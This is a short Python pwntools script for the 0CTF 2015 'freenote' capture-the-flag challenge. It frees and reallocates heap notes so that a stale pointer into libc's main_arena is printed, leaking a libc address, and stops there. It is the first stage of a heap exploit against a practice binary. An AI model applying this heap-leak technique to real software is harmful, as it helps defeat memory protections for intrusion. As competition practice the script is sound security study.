#
# 0CTF 2015 pwn freenote
#

from pwn import *

r = process('./freenote')

def new_note(s):
    r.send('2\n')
    r.sendafter('Length of new note:', str(len(s))+'\n')
    r.sendafter('Enter your note:', s)

def delete_note(n):
    r.send('4\n')
    r.sendafter('Note number:', str(n)+'\n')

def list_note():
    r.send('1\n')
    r.recvuntil('CCCCCCCC')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l) 
    
    l = l + '\x00\x00'
    l = u64(l)
    log.info('leaked libc: 0x%x' % l)

if __name__ == "__main__":
    r.recvuntil('Your choice:')

    new_note('A')
    new_note('B')

    delete_note(0)

    new_note('CCCCCCCC') # overwrite fd pointer and still we have bk pointer to <main_arena>
    
    list_note()

    raw_input('after leaking...')
